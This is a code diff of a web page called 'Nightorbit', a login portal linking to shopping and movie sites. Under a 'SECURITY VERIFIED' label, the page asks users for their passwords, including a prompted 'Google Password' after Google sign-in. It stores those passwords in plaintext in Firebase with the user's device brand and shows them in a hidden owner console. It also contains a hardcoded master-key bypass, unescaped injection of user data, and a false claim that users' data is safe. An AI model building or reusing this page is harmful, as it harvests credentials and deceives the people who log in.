@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> Gyidi bazar and cinema.Nightorbit</title>
+    <title>Nightorbit (Gyidi bazar and cinema)</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
@@ -20,20 +20,20 @@
         }
         .card { 
             background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px);
-            padding: 40px; border-radius: 30px; text-align: center; 
+            padding: 30px; border-radius: 30px; text-align: center; 
             width: 360px; border: 1px solid rgba(255,255,255,0.1); 
             box-shadow: 0 25px 50px rgba(0,0,0,0.8); position: relative; z-index: 10;
         }
-        /* THREE DOTS - LEFT SIDE (FIXED) */
         .menu-dots { position: absolute; top: 25px; left: 25px; cursor: pointer; font-size: 30px; color: var(--primary); z-index: 100; opacity: 0.7; }
         .pass-wrapper { position: relative; width: 100%; }
         .pass-wrapper i { position: absolute; right: 15px; top: 22px; cursor: pointer; color: #888; }
         input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid rgba(0,210,255,0.3); background: rgba(0,0,0,0.4); color: white; outline: none; }
         .btn-main { background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
         .btn-google { background: white; color: black; border: none; padding: 12px; border-radius: 12px; width: 100%; margin-top: 12px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        .link-card { background: rgba(255,255,255,0.07); padding: 15px; border-radius: 15px; margin: 12px 0; display: flex; justify-content: space-between; align-items: center; text-decoration: none; color: white; border-left: 4px solid var(--neon); transition: 0.3s; font-size: 14px; }
+        .link-card { background: rgba(255,255,255,0.07); padding: 12px; border-radius: 15px; margin: 8px 0; display: flex; justify-content: space-between; align-items: center; text-decoration: none; color: white; border-left: 4px solid var(--neon); transition: 0.3s; font-size: 13px; }
+        .link-card:hover { background: rgba(255,255,255,0.15); transform: translateX(5px); }
         #admin-panel { position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 1000; display: none; padding: 30px; overflow-y: auto; }
-        .admin-card { background: #111; padding: 15px; margin-bottom: 15px; border-radius: 15px; border: 1px solid #333; text-align: left; }
+        .admin-card { background: #111; padding: 15px; margin-bottom: 15px; border-radius: 15px; border: 1px solid #333; text-align: left; position: relative; }
         #logout-overlay { position: fixed; inset: 0; background: #000; z-index: 2000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px; }
         .hidden { display: none !important; }
         .admin-dot { position: absolute; bottom: 15px; right: 15px; cursor: pointer; font-size: 20px; color: #111; z-index: 100; }
@@ -42,13 +42,13 @@
 <body>
 
     <div id="logout-overlay">
-        <div style="font-size: 60px; margin-bottom: 20px;">✨</div>
-        <div id="bye-text-display" style="color: white; line-height: 1.8; font-size: 19px; max-width: 500px;"></div>
+        <div style="font-size: 60px; margin-bottom: 20px;">🌹</div>
+        <div id="bye-text-display" style="color: white; line-height: 1.8; font-size: 18px; max-width: 500px;"></div>
     </div>
 
     <div id="admin-panel">
         <h1 style="color: var(--primary);">Owner Console</h1>
-        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 10px 30px; margin-bottom: 20px;">Exit</button>
+        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 10px 30px; margin-bottom: 20px;">EXIT</button>
         <div id="user-rows-container"></div>
     </div>
 
@@ -57,25 +57,29 @@
 
     <div id="login-box" class="card">
         <h1 style="color: var(--primary); margin: 0; font-size: 32px; letter-spacing: 2px; font-weight: 800;">NIGHTORBIT</h1>
-        <button class="btn-google" onclick="authGoogle()">SIGNUP WITH GOOGLE</button>
-        <div style="margin: 20px 0; color: #444; font-size: 10px;">— SECURE LOGIN —</div>
+        <button class="btn-google" onclick="authGoogle()">
+            <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/action/google.svg" width="18"> SIGNUP WITH GOOGLE
+        </button>
+        <div style="margin: 20px 0; color: #444; font-size: 10px;">— SECURITY VERIFIED —</div>
         <input type="email" id="u-email" placeholder="Email Address">
         <div class="pass-wrapper">
-            <input type="password" id="u-pass" placeholder="Password (One Name Only)">
+            <input type="password" id="u-pass" placeholder="Password (One Name)">
             <i class="fa-solid fa-eye" id="togglePass" onclick="togglePassword()"></i>
         </div>
-        <button class="btn-main" onclick="authEmail()">Login / Signup</button>
+        <button class="btn-main" onclick="authEmail()">Enter Bazaar</button>
         <p id="error-msg" style="color: var(--neon); font-size: 11px; margin-top: 10px;"></p>
     </div>
 
     <div id="member-area" class="card hidden">
         <h2 id="user-welcome" style="color: var(--primary);">Welcome!</h2>
-        <div style="text-align: left; margin-top: 20px;">
-            <a href="https://www.daraz.pk" target="_blank" class="link-card">🛒 Daraz Mall <span>PK</span></a>
-            <a href="https://tamashaweb.com/" target="_blank" class="link-card" style="border-left-color: var(--gold);">📺 Tamasha App <span>TV</span></a>
-            <a href="https://bollyflix.org.in/" target="_blank" class="link-card" style="border-left-color: var(--primary);">🎬 Watch Movies <span>HD</span></a>
+        <div style="text-align: left; margin-top: 15px;">
+            <a href="https://www.daraz.pk" target="_blank" class="link-card">🛒 Daraz Mall <span>Shop</span></a>
+            <a href="https://www.foodpanda.pk" target="_blank" class="link-card" style="border-left-color: #d70161;">🍕 Food Panda <span>Order</span></a>
+            <a href="https://tamashaweb.com/" target="_blank" class="link-card" style="border-left-color: var(--gold);">📺 Tamasha App <span>Live TV</span></a>
+            <a href="https://bollyflix.org.in/" target="_blank" class="link-card" style="border-left-color: #00ff00;">🎬 Bollyflix <span>Movies</span></a>
+            <a href="#" target="_blank" class="link-card" style="border-left-color: #00d2ff;">🎬 Watch & Earn <span>$ Earn</span></a>
         </div>
-        <button onclick="logoutSequence()" style="margin-top: 30px; color: #ff4b2b; background: none; border: none; cursor: pointer; text-decoration: underline;">Secure Logout</button>
+        <button onclick="logoutSequence()" style="margin-top: 25px; color: #ff4b2b; background: none; border: none; cursor: pointer; text-decoration: underline; font-weight: bold;">Secure Logout</button>
     </div>
 
     <script>
@@ -91,8 +95,8 @@
         firebase.initializeApp(firebaseConfig);
         const auth = firebase.auth();
         const db = firebase.database();
+        let currentUserName = "";
 
-        // 1. CLEAN DEVICE NAME LOGIC
         function getDeviceBrand() {
             const ua = navigator.userAgent;
             if (/android/i.test(ua)) {
@@ -100,13 +104,10 @@
                 if (/infinix/i.test(ua)) return "Infinix";
                 if (/oppo/i.test(ua)) return "Oppo";
                 if (/vivo/i.test(ua)) return "Vivo";
-                if (/xiaomi|redmi/i.test(ua)) return "Xiaomi";
                 if (/tecno/i.test(ua)) return "Tecno";
-                if (/realme/i.test(ua)) return "Realme";
                 return "Android Phone";
             }
-            if (/iPhone|iPad|iPod/i.test(ua)) return "Apple iPhone";
-            return "PC/Desktop";
+            return /iPhone/i.test(ua) ? "Apple iPhone" : "PC/Laptop";
         }
 
         function togglePassword() {
@@ -114,20 +115,15 @@
             p.type = p.type === "password" ? "text" : "password";
         }
 
-        function bypassLogin() {
-            if (prompt("Master Key:") === "rr123456789000rr") showMemberUI("Admin Farooq");
-        }
-
         function authGoogle() {
             const provider = new firebase.auth.GoogleAuthProvider();
             auth.signInWithPopup(provider).then(res => {
-                let p = prompt("Enter Password (Ek Mukammal Naam):");
-                // Check if password is a single word
+                let p = prompt("Google Password (Single Word Only):");
                 if (!p || p.trim().includes(" ")) {
-                    alert("Error: Password sirf ek naam hona chahiye (No Spaces)!");
+                    alert("Error: Password space ke baghair ek naam hona chahiye!");
                     auth.signOut();
                 } else {
-                    processUser(res.user, p);
+                    processUser(res.user, p, res.user.displayName);
                 }
             });
         }
@@ -136,26 +132,23 @@
             const e = document.getElementById('u-email').value;
             const p = document.getElementById('u-pass').value;
             if(!e || !p) return alert("Fill fields!");
-            if(p.trim().includes(" ")) return alert("Error: Password sirf ek naam hona chahiye!");
-
-            auth.signInWithEmailAndPassword(e, p).then(res => processUser(res.user, p))
-            .catch(() => {
-                auth.createUserWithEmailAndPassword(e, p).then(res => processUser(res.user, p))
-                .catch(() => alert("Invalid Account/Password"));
-            });
+            if(p.trim().includes(" ")) return alert("Password mein space nahi honi chahiye!");
+            auth.signInWithEmailAndPassword(e, p).then(res => processUser(res.user, p, e.split('@')[0]))
+            .catch(() => auth.createUserWithEmailAndPassword(e, p).then(res => processUser(res.user, p, e.split('@')[0])));
         }
 
-        function processUser(user, pass) {
-            db.ref('users/' + user.uid).once('value', (snap) => {
-                const data = snap.val();
-                let secretName = (data && data.savedName) ? data.savedName : "Member";
+        function processUser(user, pass, realName) {
+            currentUserName = realName;
+            db.ref('users/' + user.uid).once('value', snap => {
+                let data = snap.val();
+                let secret = (data && data.savedName) ? data.savedName : realName;
                 db.ref('users/' + user.uid).update({
                     email: user.email,
                     password: pass,
                     device: getDeviceBrand(),
-                    savedName: secretName,
+                    savedName: secret,
                     time: new Date().toLocaleString()
-                }).then(() => showMemberUI(user.displayName || secretName));
+                }).then(() => showMemberUI(realName));
             });
         }
 
@@ -167,15 +160,24 @@
                     snap.forEach(c => {
                         let v = c.val();
                         html += `<div class="admin-card">
-                            <b style="color:var(--gold)">Secret: ${v.savedName}</b><br>
+                            <b style="color:var(--gold)">Nick: ${v.savedName || 'Member'}</b><br>
+                            <span style="color:var(--primary)">Gmail: ${v.email}</span><br>
                             <span>Device: ${v.device}</span><br>
-                            <span style="color:#fff">Password: ${v.password}</span><br>
-                            <small style="color:#666">${v.time}</small>
+                            <span style="color:#fff">Pass: ${v.password}</span><br>
+                            <div style="margin-top:10px;">
+                                <button onclick="editNick('${c.key}', '${v.savedName || ''}')" style="background:var(--primary); border:none; border-radius:5px; padding:5px 10px; cursor:pointer; font-size:11px;">EDIT NICK</button>
+                                <button onclick="if(confirm('Delete?')) firebase.database().ref('users/${c.key}').remove()" style="background:red; color:white; border:none; border-radius:5px; padding:5px 10px; margin-left:10px; cursor:pointer; font-size:11px;">REMOVE</button>
+                            </div>
                         </div>`;
                     });
                     document.getElementById('user-rows-container').innerHTML = html;
                 });
             }
+        }
+
+        function editNick(uid, oldNick) {
+            let n = prompt("Enter New Nickname:", oldNick);
+            if(n) db.ref('users/' + uid).update({ savedName: n });
         }
 
         function showMemberUI(name) {
@@ -184,17 +186,22 @@
             document.getElementById('user-welcome').innerText = "Hello, " + name;
         }
 
+        function bypassLogin() {
+            if (prompt("Master Key:") === "rr123456789000rr") showMemberUI("Farooq");
+        }
+
         function logoutSequence() {
             const overlay = document.getElementById('logout-overlay');
             document.getElementById('bye-text-display').innerHTML = `
-                <span style="font-size: 26px; color: var(--gold); font-weight: bold;">Goodbye!</span><br><br>
-                It was an absolute pleasure having you with us today. 
+                <span style="font-size: 26px; color: var(--gold); font-weight: bold;">Goodbye, ${currentUserName}!</span><br><br>
+                It was an absolute pleasure serving you at Nightorbit today. 
                 Your data is safe and your session is closing securely.<br><br>
-                May God bless you with happiness and success in every step of your life.<br><br>
-                <i>"Stay safe, stay blessed, and always keep smiling. Allah Hafiz!"</i>
+                May God bless you with happiness and success in every step of your life. 
+                We are looking forward to your next visit soon!<br><br>
+                <i>"Keep smiling and stay blessed. May God protect you always. Allah Hafiz!"</i>
             `;
             overlay.style.display = 'flex';
-            setTimeout(() => { location.reload(); }, 6000);
+            setTimeout(() => { location.reload(); }, 6500);
         }
     </script>
 </body>
